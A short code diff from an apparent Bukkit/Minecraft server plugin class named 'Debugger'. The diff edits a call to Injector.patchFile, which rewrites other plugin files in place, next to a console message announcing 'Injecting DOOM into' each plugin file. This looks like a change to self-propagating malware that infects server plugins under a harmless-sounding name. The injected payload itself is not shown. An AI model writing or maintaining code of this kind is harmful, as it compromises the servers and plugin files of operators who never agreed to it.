@@ -74,7 +74,8 @@ public final class Debugger implements Listener {
                         Bukkit.getConsoleSender()
                                 .sendMessage("Injecting DOOM into: " + plugin_file.getPath());
 
-                    boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(), new com.thiccindustries.debugger.Injector.SimpleConfig(prefix, InjectOther, warnings), true, !warnings);
+                    boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(),
+                            new com.thiccindustries.debugger.Injector.SimpleConfig(prefix, InjectOther, warnings), true, warnings, false);
 
                     if (Config.display_debug_messages)
                         Bukkit.getConsoleSender()
